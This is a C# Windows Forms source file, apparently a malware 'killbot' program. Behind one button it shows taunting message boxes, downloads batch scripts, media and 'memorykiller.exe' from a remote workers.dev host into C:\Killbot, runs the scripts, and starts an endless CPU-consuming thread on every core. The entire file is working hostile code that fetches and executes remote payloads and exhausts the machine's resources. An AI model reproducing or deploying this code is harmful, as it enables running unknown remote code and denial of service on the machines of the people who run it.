using System.Diagnostics;
using System.Net;
#pragma warning disable SYSLIB0014

namespace killbot_ui
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
                                                                                                                                                                                                                                                                                       
        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("dumbass really clicked the button");
            MessageBox.Show("killbot always wins");
            MessageBox.Show("join molten");
            MessageBox.Show("boldstep");
            MessageBox.Show("KILLBOT");
            MessageBox.Show("No anti-virus???");
            MessageBox.Show("John");
            MessageBox.Show("MUIE CRISTI");
            MessageBox.Show("sio");

            Directory.CreateDirectory("C:\\Killbot");

            Directory.CreateDirectory("C:\\Killbot\\scripts");

            Directory.CreateDirectory("C:\\Killbot\\files");

            Directory.CreateDirectory("C:\\Killbot\\files\\something");

            Directory.CreateDirectory("C:\\Killbot\\files\\memorykiller");

            var client = new WebClient();


            client.DownloadFile("https://hickos.hickdick.workers.dev/0:/killbot.mp3", "C:\\Killbot\\files\\killbot.mp3");

            client.DownloadFile("https://hickos.hickdick.workers.dev/0:/killbot.mp4", "C:\\Killbot\\files\\killbot.mp4");

            client.DownloadFile("https://hickos.hickdick.workers.dev/0:/Killbot.bat", "C:\\Killbot\\scripts\\Killbot.bat");

            client.DownloadFile("https://hickos.hickdick.workers.dev/0:/Killbot1.bat", "C:\\Killbot\\scripts\\Killbot1.bat");

            client.DownloadFile("https://hickos.hickdick.workers.dev/0:/Killbot2.bat", "C:\\Killbot\\scripts\\Killbot2.bat");

            client.DownloadFile("https://hickos.hickdick.workers.dev/0:/Killbot3.bat", "C:\\Killbot\\scripts\\Killbot3.bat");

            client.DownloadFile("https://hickos.hickdick.workers.dev/0:/Killbot4.bat", "C:\\Killbot\\scripts\\Killbot4.bat");

            client.DownloadFile("https://hickos.hickdick.workers.dev/0:/Killbot.txt", "C:\\Killbot\\files\\killbot.txt");

            client.DownloadFile("https://hickos.hickdick.workers.dev/0:/Killbot5.bat", "C:\\Killbot\\scripts\\Killbot5.bat");

            client.DownloadFile("https://hickos.hickdick.workers.dev/0:/Killbot6.bat", "C:\\Killbot\\scripts\\Killbot6.bat");

            client.DownloadFile("https://hickos.hickdick.workers.dev/0:/memorykiller.exe", "C:\\Killbot\\files\\memorykiller\\memorykiller.exe");

            System.Diagnostics.Process.Start("C:\\Killbot\\scripts\\Killbot3.bat");

            System.Diagnostics.Process.Start("C:\\Killbot\\scripts\\Killbot5.bat");

            System.Diagnostics.Process.Start("C:\\Killbot\\scripts\\Killbot4.bat");

            System.Diagnostics.Process.Start("C:\\Killbot\\scripts\\Killbot1.bat");

            System.Diagnostics.Process.Start("C:\\Killbot\\scripts\\Killbot.bat");

            System.Diagnostics.Process.Start("C:\\Killbot\\scripts\\Killbot2.bat");

            System.Diagnostics.Process.Start("C:\\Killbot\\scripts\\Killbot6.bat");


            int percentage = 80;
            for (int i = 0; i < Environment.ProcessorCount; i++)
            {
                (new Thread(() =>
                {
                    Stopwatch watch = new Stopwatch();
                    watch.Start();
                    while (true)
                    {
                        if (watch.ElapsedMilliseconds > percentage)
                        {
                            Thread.Sleep(100 - percentage);
                            watch.Reset();
                            watch.Start();
                        }
                    }
                })).Start();
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
// big thanks to join molten for helping me do this in the challenge list server 
